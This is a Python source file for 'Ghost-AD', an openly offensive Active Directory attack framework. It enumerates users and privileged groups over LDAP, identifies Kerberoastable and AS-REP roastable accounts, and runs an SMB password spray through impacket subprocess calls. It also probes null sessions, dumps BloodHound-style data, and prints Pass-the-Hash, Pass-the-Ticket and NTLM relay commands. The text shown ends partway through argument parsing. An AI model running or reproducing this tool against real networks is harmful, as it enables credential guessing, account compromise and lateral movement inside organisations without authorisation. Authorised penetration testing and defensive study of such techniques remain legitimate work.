#!/usr/bin/env python3
# Ghost-AD v1.0.0 - Active Directory Attack Framework
# By Gh0st-Bx1 | github.com/Ghost-Bx1
# ============================================================

import argparse
import json
import os
import platform
import socket
import struct
import sys
import time
from datetime import datetime, timezone

try:
    import colorama
    colorama.init(autoreset=False)
except ImportError:
    pass

VERSAO = "1.0.0"

C = {
    "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m", "B": "\033[94m",
    "M": "\033[95m", "C": "\033[96m", "W": "\033[97m", "X": "\033[0m",
    "N": "\033[1m", "D": "\033[2m",
}


def _build_banner():
    import re as _re
    G = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
    W = "\033[97m"; X = "\033[0m"
    IW = 68; eq = "\u2550" * IW; sp = " " * IW
    TL = "\u2554"; TR = "\u2557"; BL = "\u255a"; BR = "\u255d"; VB = "\u2551"
    hl = "\u2500" * 44; bar = "\u2502"
    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))

    def _row(s):
        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
        return f"{G}{VB}{X}{' ' * l}{s}{' ' * r}{G}{VB}{X}"

    def _row_l(s):
        n = vl(s); p = max(0, IW - n - 2)
        return f"{G}{VB}{X}  {s}{' ' * p}{G}{VB}{X}"

    # Ghost art (braille pixel art)
    ga = [
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠿⠟⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⢀⣠⣤⣶⣶⣶⣶⣶⣶⣤⣀⠢⢝⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡡⢀⣴⡿⢋⡴⢿⣿⣿⣿⣿⣿⣿⣿⢷⣦⡑⠈⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡜⢠⣾⣿⣤⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣶⣦⣤⣤⣀⠉⠻⣿⣿⣿⡿⠿⢛⢛⡻⠿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⠿⠟⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⣿⣿⣿⡿⠛⠛⠻⣿⣿⣿⡿⠛⠛⢿⣿⣿⣧⠉⠉⣁⣈⣉⣁⢀⣿⣿⢋⠄⣁⣴⣶⣄⠐⢌⢻⣿⣿{X}", ""),
        ("", f"{G}⡏⠀⣴⣦⣄⠢⡙⢿⣿⣿⣿⣿⣿⣿⡇⠀⣼⣿⣿⣿⠅⠀⠀  ⢹⣿⡿⠁⠀⠀⠀⢹⣿⣿⡆⠀⣿⣿⣿⣿⣿⡟⠁⢀⣴⣿⣿⣿⣿⣷⡈⠎⢿⣿{X}", ""),
        ("", f"{G}⡇⠀⣿⣿⣿⣷⣌⠀⠙⢿⣿⣿⣿⣿⠀⢀⣿⣿⣿⣿⠀⠀⠀  ⠀⠈⣿⡇⠀⠀⠀⠀⠈⢿⣿⡇⠁⢻⣿⣿⣿⡿⠁⢠⣾⣿⣿⣿⡿⢿⣿⣷⠀⠘⣿{X}", ""),
        ("", f"{G}⣇⠀⢿⣿⣿⡟⣿⣷⣄⠀⠙⢿⣿⡇⠀⣸⣿⣿⡿⣿⡀⠀⠀⠀  ⢸⣿⣧⠀⠀⠀⠀⣸⡈⣿⣷⠀⡈⣿⣿⡿⠁⢀⣾⣿⣿⢩⣿⠁⣾⣿⣿⡆⠀⢿{X}", ""),
        ("", f"{G}⣿⡀⠘⣿⣿⣿⡘⣿⣿⣷⣌⠂⠉⠁⢠⣿⣿⡟⣰⢿⣷⣤⣤⣴⣿⣿⣿⣷⣄⣠⣴⣿⣧⠸⣿⣧⡐⠢⠉⠁⢀⣾⣿⣿⡇⣼⣿⢸⣿⣿⣿⣇⠀⢸{X}", ""),
        ("", f"{G}⣿⣷⡀⠸⣿⣿⣧⠸⣿⣿⣿⣿⣶⣶⣿⣿⠏⡰⢃⣾⣿⣿⣿⣿⡏⠀⠈⣿⣿⣿⣿⣿⣏⠳⣘⣿⣿⣷⣶⣾⣿⣿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⠀⣿⣿⣿⡄⡿⢿⣿⣿⣿⣿⣿⣷⣾⣷⣿⣿⣿⣿⣿⣿⣧⣀⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠋⢉⠉⡉⠛⠿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⢀⣿⣿⣿⣧⢸⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣾⣿⡄⠈⠀⠀⠀⠀ ⣾{X}", ""),
        ("", f"{G}⣿⡟⠀⣸⣿⣿⣿⣿⣜⡇⢿⣧⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡉⠻⠇⠀⠰⠀⠀ ⣀⣾{X}", ""),
        ("", f"{G}⣿⠃⢠⣿⣿⠿⠿⠿⢿⣿⠸⣿⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢣⢸⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⢰⠜⠋⠀⢀⡄⢰⣤⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠃⢻⣿⣿{X}", ""),
        ("", f"{G}⣿⣆⠠⠀⡀⠀⠁⣿⣿⠟⠀⣽⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⢃⣿⣿⣿⡟⣸⣿⣿⣿⣿⡿⠋⢠⢃⣾⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣷⣶⠆⡄⠈⢉⣠⣴⣾⣿⢿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣴⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⠇⠛⢏⠉⠉⠁⠤⢊⣥⣾⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⢄⠀⢾⣿⣿⣿⣿⡇⢸⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣶⣬⣭⣶⣾⣿⣿⠏⣼⣿⣿⣿⡇⣸⣿⣿⣿⠀⣰⣿⡁⢠⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣤⣀⡀⠀⠀⠉⠉⠁⢸⣿⣿⣿⢸⣿⣿⣿⣿⡹⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣿⣿⣿⣿⠇⣿⣿⣿⣿⡀⠹⢿⡇⠀⢿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠛⠀⣼⣿⣿⣿⢸⣿⣿⢻⣿⣷⣌⠻⣿⣿⣿⣿⠟⣡⣾⣿⡟⣼⣿⣿⠀⣿⣿⣿⣿⣿⣶⣤⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠈⠀⣴⣾⣿⣿⣿⡇⢸⣿⣿⣇⢻⣿⣿⣷⣦⣭⣭⣴⣾⣿⣿⣿⢡⣿⣿⣿⠀⣿⣿⣿⣿⣿⠿⠟⠃⡀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⡐⠠⢈⡉⠛⠛⠿⡇⢸⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⠀⣁⣤⡄⠀⣀⣒⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⡌⠀⣦⠀⣼⣿⣿⣿⣇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿⣄⡈⠛⠃⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢁⣤⣿⣿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣦⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠠⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⢼⠿⠿⣿⣿⣿⣿⠟⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠈⣙⠛⠛⣛⣛⠛⠀⠻⢿⣿⣿⣿⣿⣿⣿⡃⢠⣤⠀⠀⣀⣉⣁⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣤⡀⢀⠈⢿⣿⣿⣿⣿⣷⣄⠁⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠁⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠠⢠⣿⣿⣿⣿⣿⠟⢀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠀⢸⣿⣿⣿⡿⢁⡄⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠰⠘⣿⣿⣿⠁⠎⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡑⠈⠻⠇⠈⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
    ]

    info = [
        f"{G}{N}GHOST-AD{X}",
        f"{Cy}v{VERSAO}  {D}Active Directory Attack Framework{X}",
        f"{D}{hl}{X}",
        f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
        f"{D}{hl}{X}",
        f"{D}ldap  kerb  asrep  spray  smb  bloodhound{X}",
        f"{D}--dc  --domain  --user  --pass  --hash{X}",
        f"{D}--output  --json  --bloodhound-out{X}",
    ]

    out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
    for left, center, right in ga:
        combined = left + center + right
        out.append(_row(combined))
    out.append(f"{G}{VB}{sp}{VB}{X}")
    for i in info:
        out.append(_row_l(i))
    out += [f"{G}{VB}{sp}{VB}{X}", f"{G}{BL}{eq}{BR}{X}"]
    return "\n".join(out)


BANNER = _build_banner()


# ─────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────

def _log(msg, nivel="INFO"):
    cores = {
        "INFO": C["D"], "OK": C["G"], "ALERTA": C["Y"],
        "ERRO": C["R"], "ACHADO": C["C"], "TITULO": C["N"],
        "CRITICO": C["R"] + C["N"],
    }
    cor = cores.get(nivel, C["D"])
    print(f"  {cor}[{nivel}]{C['X']} {msg}")


def _secao(titulo):
    print(f"\n  {C['G']}{C['N']}{'─'*6} {titulo} {'─'*6}{C['X']}")


def _socket_connect(host, porta, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, porta))
        return s
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────
# LDAP Enumeration
# ─────────────────────────────────────────────────────────────────

def ldap_enum(dc, domain, user=None, password=None, verbose=False):
    """Enumeracao LDAP basica via socket (sem ldap3) — tenta bind anonimo e listagem."""
    resultado = {"dc": dc, "domain": domain, "usuarios": [], "grupos": [], "erro": None}
    _secao("LDAP ENUMERATION")
    _log(f"DC: {dc} | Dominio: {domain}", "INFO")

    # Tenta ldap3 se disponivel
    try:
        import ldap3
        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
        if user and password:
            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
                                    authentication=ldap3.NTLM, auto_bind=True)
            _log(f"Bind autenticado como {user}", "OK")
        else:
            conn = ldap3.Connection(servidor, auto_bind=True)
            _log("Bind anonimo bem-sucedido", "OK")

        base_dn = "DC=" + ",DC=".join(domain.split("."))

        # Usuarios
        conn.search(base_dn, "(objectClass=person)",
                    attributes=["sAMAccountName", "userPrincipalName", "description",
                                "memberOf", "userAccountControl", "lastLogon"])
        for entry in conn.entries[:50]:
            uac = getattr(entry, "userAccountControl", None)
            no_preauth = bool(int(str(uac)) & 0x400000) if uac else False
            resultado["usuarios"].append({
                "sam": str(getattr(entry, "sAMAccountName", "")),
                "upn": str(getattr(entry, "userPrincipalName", "")),
                "desc": str(getattr(entry, "description", "")),
                "no_preauth": no_preauth,
            })
            if no_preauth:
                _log(f"AS-REP ROASTING possivel: {entry.sAMAccountName}", "CRITICO")
            elif verbose:
                _log(f"Usuario: {entry.sAMAccountName}", "ACHADO")

        # Grupos
        conn.search(base_dn, "(objectClass=group)",
                    attributes=["cn", "member", "description"])
        interessantes = ["domain admins", "enterprise admins", "schema admins",
                         "administrators", "backup operators", "account operators"]
        for entry in conn.entries[:100]:
            cn = str(getattr(entry, "cn", "")).lower()
            membros = [str(m) for m in (getattr(entry, "member", []) or [])]
            resultado["grupos"].append({"cn": str(getattr(entry, "cn", "")), "membros": len(membros)})
            if any(i in cn for i in interessantes):
                _log(f"Grupo privilegiado: {entry.cn} ({len(membros)} membros)", "ALERTA")
                for m in membros[:5]:
                    _log(f"  Membro: {m.split(',')[0].replace('CN=','')}", "ACHADO")

        _log(f"Total: {len(resultado['usuarios'])} usuarios | {len(resultado['grupos'])} grupos", "OK")
        conn.unbind()
        return resultado

    except ImportError:
        _log("ldap3 nao instalado. Instale: pip install ldap3", "ALERTA")
        _log("Tentando enumeracao via sondagem de porta...", "INFO")
    except Exception as e:
        _log(f"Erro de conexao LDAP: {e}", "ERRO")
        _log("Tentando enumeracao via sondagem de porta...", "INFO")

    # Fallback: checar porta 389
    s = _socket_connect(dc, 389, timeout=3)
    if s:
        _log("Porta LDAP 389 aberta no DC", "OK")
        s.close()
    else:
        _log("Porta LDAP 389 fechada/filtrada", "ALERTA")

    s2 = _socket_connect(dc, 636, timeout=3)
    if s2:
        _log("Porta LDAPS 636 aberta no DC", "OK")
        s2.close()

    resultado["erro"] = "ldap3 nao disponivel"
    return resultado


# ─────────────────────────────────────────────────────────────────
# Kerberoasting hints
# ─────────────────────────────────────────────────────────────────

def kerberoast(dc, domain, user=None, password=None, verbose=False):
    """Identifica contas com SPN (alvo de Kerberoasting) via LDAP."""
    resultado = {"spn_contas": [], "erro": None}
    _secao("KERBEROASTING")
    _log("Buscando contas com SPN configurado (alvos de Kerberoasting)...", "INFO")

    try:
        import ldap3
        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
        if user and password:
            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
                                    authentication=ldap3.NTLM, auto_bind=True)
        else:
            conn = ldap3.Connection(servidor, auto_bind=True)

        base_dn = "DC=" + ",DC=".join(domain.split("."))
        conn.search(base_dn,
                    "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                    attributes=["sAMAccountName", "servicePrincipalName", "memberOf"])
        for entry in conn.entries:
            spns = [str(s) for s in (getattr(entry, "servicePrincipalName", []) or [])]
            resultado["spn_contas"].append({
                "sam": str(getattr(entry, "sAMAccountName", "")),
                "spns": spns,
            })
            _log(f"SPN encontrado: {entry.sAMAccountName} -> {spns[:2]}", "ALERTA")

        total = len(resultado["spn_contas"])
        _log(f"Kerberoasting: {total} conta(s) com SPN encontrada(s)", "OK" if total == 0 else "CRITICO")
        if total:
            _log("Use: impacket GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request", "INFO")
        conn.unbind()
    except ImportError:
        _log("ldap3 nao disponivel. Instale: pip install ldap3", "ALERTA")
        resultado["erro"] = "ldap3 nao disponivel"
    except Exception as e:
        resultado["erro"] = str(e)
        _log(f"Erro Kerberoast: {e}", "ERRO")

    return resultado


# ─────────────────────────────────────────────────────────────────
# AS-REP Roasting
# ─────────────────────────────────────────────────────────────────

def asrep_roast(dc, domain, users=None, verbose=False):
    """Lista usuarios com DONT_REQUIRE_PREAUTH via LDAP (ou testa lista fornecida)."""
    resultado = {"vulneraveis": [], "erro": None}
    _secao("AS-REP ROASTING")
    _log("Buscando usuarios com 'Nao requer pre-autenticacao Kerberos'...", "INFO")

    try:
        import ldap3
        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
        conn = ldap3.Connection(servidor, auto_bind=True)
        base_dn = "DC=" + ",DC=".join(domain.split("."))
        # UAC flag 0x400000 = DONT_REQUIRE_PREAUTH
        conn.search(base_dn,
                    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
                    attributes=["sAMAccountName", "userPrincipalName"])
        for entry in conn.entries:
            sam = str(getattr(entry, "sAMAccountName", ""))
            resultado["vulneraveis"].append(sam)
            _log(f"AS-REP ROASTABLE: {sam}", "CRITICO")

        total = len(resultado["vulneraveis"])
        _log(f"AS-REP Roasting: {total} usuario(s) vulneravel(is)", "OK" if total == 0 else "CRITICO")
        if total:
            _log("Use: impacket GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -format hashcat", "INFO")
        conn.unbind()
    except ImportError:
        _log("ldap3 nao disponivel. Tente: pip install ldap3", "ALERTA")
        if users:
            _log(f"Testando {len(users)} usuarios da lista fornecida...", "INFO")
            for u in users:
                _log(f"  -> {u} (teste manual necessario)", "INFO")
        resultado["erro"] = "ldap3 nao disponivel"
    except Exception as e:
        resultado["erro"] = str(e)
        _log(f"Erro AS-REP: {e}", "ERRO")

    return resultado


# ─────────────────────────────────────────────────────────────────
# Password Spray
# ─────────────────────────────────────────────────────────────────

def password_spray(dc, domain, users, password, lockout_threshold=3, delay=1.0, verbose=False):
    """Password spray via SMB (porta 445) com deteccao de lockout."""
    resultado = {"validos": [], "lockout_suspeito": False, "testados": 0}
    _secao("PASSWORD SPRAY")
    _log(f"Spray: {len(users)} usuarios | Senha: {password!r} | DC: {dc}", "INFO")
    _log(f"Threshold lockout: {lockout_threshold} | Delay: {delay}s entre tentativas", "ALERTA")

    # Usa impacket via subprocess se disponivel
    try:
        import subprocess
        for i, user in enumerate(users):
            try:
                cmd = ["python3", "-c",
                       f"from impacket.smbconnection import SMBConnection; "
                       f"c = SMBConnection('{dc}', '{dc}'); "
                       f"c.login('{user}', '{password}', '{domain}'); "
                       f"print('OK')"]
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                resultado["testados"] += 1
                if "OK" in r.stdout:
                    resultado["validos"].append({"user": user, "password": password})
                    _log(f"CREDENCIAL VALIDA: {domain}\\{user}:{password}", "CRITICO")
                elif "STATUS_ACCOUNT_LOCKED" in (r.stdout + r.stderr):
                    resultado["lockout_suspeito"] = True
                    _log(f"LOCKOUT detectado para {user} — pausando spray", "ALERTA")
                    time.sleep(delay * 10)
                if verbose:
                    _log(f"Testado: {user} -> {'VALIDO' if resultado['validos'] and resultado['validos'][-1]['user'] == user else 'invalido'}", "INFO")
                time.sleep(delay)
            except subprocess.TimeoutExpired:
                continue
    except Exception as e:
        _log(f"Impacket nao disponivel ou erro: {e}", "ALERTA")
        _log("Use: crackmapexec smb DC_IP -u users.txt -p 'Senha' --continue-on-success", "INFO")
        resultado["erro"] = "impacket nao disponivel"

    _log(f"Spray finalizado: {resultado['testados']} testados | {len(resultado['validos'])} valido(s)", "OK")
    return resultado


# ─────────────────────────────────────────────────────────────────
# SMB Enumeration
# ─────────────────────────────────────────────────────────────────

def smb_enum(dc, domain, user=None, password=None, verbose=False):
    """Enumeracao SMB: shares, sessoes, null session, relays."""
    resultado = {"shares": [], "null_session": False, "erro": None}
    _secao("SMB ENUMERATION")
    _log(f"Alvo SMB: {dc}", "INFO")

    # Checa porta 445
    s = _socket_connect(dc, 445, timeout=3)
    if not s:
        _log("Porta SMB 445 fechada/filtrada", "ALERTA")
        resultado["erro"] = "porta 445 fechada"
        return resultado
    s.close()
    _log("Porta SMB 445 aberta", "OK")

    # Tenta impacket
    try:
        import subprocess
        # Null session
        cmd_null = ["python3", "-c",
                    f"from impacket.smbconnection import SMBConnection; "
                    f"c = SMBConnection('{dc}', '{dc}'); "
                    f"c.login('', ''); "
                    f"shares = c.listShares(); "
                    f"print('NULL_OK'); "
                    f"[print('SHARE:' + s['shi1_netname'].decode()) for s in shares]"]
        r = subprocess.run(cmd_null, capture_output=True, text=True, timeout=5)
        if "NULL_OK" in r.stdout:
            resultado["null_session"] = True
            _log("NULL SESSION bem-sucedida — enumeracao sem credenciais possivel", "CRITICO")
        for linha in r.stdout.splitlines():
            if linha.startswith("SHARE:"):
                share = linha.replace("SHARE:", "").strip()
                resultado["shares"].append(share)
                _log(f"Share encontrado: {share}", "ACHADO")
    except Exception as e:
        _log(f"Impacket nao disponivel: {e}", "ALERTA")
        _log("Use: smbclient -L //{dc} -N  OU  crackmapexec smb {dc} --shares".format(dc=dc), "INFO")
        resultado["erro"] = "impacket nao disponivel"

    # Verifica assinatura (relay)
    _log("Hint: Verificar SMB Signing com: nmap --script smb2-security-mode -p 445 " + dc, "INFO")
    _log("Se signing=off -> NTLM Relay possivel via responder/ntlmrelayx", "ALERTA")

    return resultado


# ─────────────────────────────────────────────────────────────────
# BloodHound-Lite
# ─────────────────────────────────────────────────────────────────

def bloodhound_lite(dc, domain, user=None, password=None, output_file="bloodhound_lite.json", verbose=False):
    """Coleta dados basicos para analise de caminhos de ataque (BloodHound-lite)."""
    _secao("BLOODHOUND-LITE")
    _log(f"Coletando dados de AD para {domain}...", "INFO")

    dados = {
        "meta": {
            "ferramenta": "ghost-ad/bloodhound-lite",
            "versao": VERSAO,
            "dominio": domain,
            "dc": dc,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        },
        "usuarios": [], "grupos": [], "spns": [], "asrep": [],
    }

    try:
        import ldap3
        servidor = ldap3.Server(dc, port=389, get_info=ldap3.ALL, connect_timeout=5)
        if user and password:
            conn = ldap3.Connection(servidor, user=f"{domain}\\{user}", password=password,
                                    authentication=ldap3.NTLM, auto_bind=True)
        else:
            conn = ldap3.Connection(servidor, auto_bind=True)

        base_dn = "DC=" + ",DC=".join(domain.split("."))

        # Usuarios
        conn.search(base_dn, "(objectClass=user)",
                    attributes=["sAMAccountName", "memberOf", "userAccountControl",
                                "servicePrincipalName", "adminCount"])
        for entry in conn.entries:
            uac = int(str(getattr(entry, "userAccountControl", 0) or 0))
            sam = str(getattr(entry, "sAMAccountName", ""))
            spns = [str(s) for s in (getattr(entry, "servicePrincipalName", []) or [])]
            admin_count = int(str(getattr(entry, "adminCount", 0) or 0))
            membros = [str(m).split(",")[0].replace("CN=", "") for m in (getattr(entry, "memberOf", []) or [])]
            dados["usuarios"].append({
                "sam": sam, "grupos": membros, "admin_count": admin_count,
                "no_preauth": bool(uac & 0x400000), "disabled": bool(uac & 0x2),
                "spns": spns,
            })
            if spns:
                dados["spns"].append({"sam": sam, "spns": spns})
            if uac & 0x400000:
                dados["asrep"].append(sam)

        # Grupos
        conn.search(base_dn, "(objectClass=group)",
                    attributes=["cn", "member", "adminCount"])
        for entry in conn.entries:
            members = [str(m).split(",")[0].replace("CN=", "") for m in (getattr(entry, "member", []) or [])]
            dados["grupos"].append({
                "cn": str(getattr(entry, "cn", "")),
                "membros": members,
                "admin_count": int(str(getattr(entry, "adminCount", 0) or 0)),
            })

        conn.unbind()

        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(dados, f, indent=2, ensure_ascii=False, default=str)

        _log(f"BloodHound-lite salvo: {output_file}", "OK")
        _log(f"Usuarios: {len(dados['usuarios'])} | Grupos: {len(dados['grupos'])} | SPNs: {len(dados['spns'])} | AS-REP: {len(dados['asrep'])}", "INFO")

        # Sugestoes de caminhos
        if dados["spns"]:
            _log(f"KERBEROASTING: {len(dados['spns'])} conta(s) alvo", "CRITICO")
        if dados["asrep"]:
            _log(f"AS-REP ROASTING: {len(dados['asrep'])} usuario(s)", "CRITICO")

    except ImportError:
        _log("ldap3 nao disponivel. Instale: pip install ldap3", "ALERTA")
        _log("Alternativa: bloodhound-python -u user -p pass -d domain -dc dc_ip -c All", "INFO")
        dados["erro"] = "ldap3 nao disponivel"

    return dados


# ─────────────────────────────────────────────────────────────────
# PTH / PTT Hints
# ─────────────────────────────────────────────────────────────────

def pth_ptt_hints(domain, dc, user=None, hash_nt=None):
    """Exibe dicas de Pass-the-Hash e Pass-the-Ticket."""
    _secao("PTH / PTT HINTS")
    _log("Pass-the-Hash (PTH) — requer hash NTLM do usuario alvo", "INFO")
    print(f"\n  {C['Y']}Impacket wmiexec:{C['X']}")
    print(f"    python3 wmiexec.py {domain}/{user}@{dc} -hashes :{hash_nt or 'HASH_NTLM'}")
    print(f"\n  {C['Y']}Impacket psexec:{C['X']}")
    print(f"    python3 psexec.py {domain}/{user}@{dc} -hashes :{hash_nt or 'HASH_NTLM'}")
    print(f"\n  {C['Y']}CrackMapExec:{C['X']}")
    print(f"    crackmapexec smb {dc} -u {user or 'user'} -H {hash_nt or 'HASH_NTLM'}")

    _log("Pass-the-Ticket (PTT) — requer ticket Kerberos (.ccache)", "INFO")
    print(f"\n  {C['Y']}Impacket getST (Silver Ticket):{C['X']}")
    print(f"    python3 getST.py -spn SERVICE/{dc} {domain}/{user or 'user'}:{'{'}PASS{'}'} -dc-ip {dc}")
    print(f"\n  {C['Y']}Usar ticket:{C['X']}")
    print(f"    export KRB5CCNAME=ticket.ccache")
    print(f"    python3 smbclient.py -k {domain}/{user or 'user'}@{dc}")
    print()


# ─────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        prog="ghost-ad",
        description=f"Ghost-AD v{VERSAO} - Active Directory Attack Framework | By Gh0st-Bx1",
        formatter_class=argparse.RawTextHelpFormatter,
    )

    sub = parser.add_subparsers(dest="modo")

    # Modo LDAP
    p_ldap = sub.add_parser("ldap", help="Enumeracao LDAP (usuarios, grupos, atributos)")
    p_ldap.add_argument("--dc", required=True, help="IP ou hostname do Domain Controller")
    p_ldap.add_argument("--domain", required=True, help="Dominio (ex: corp.local)")
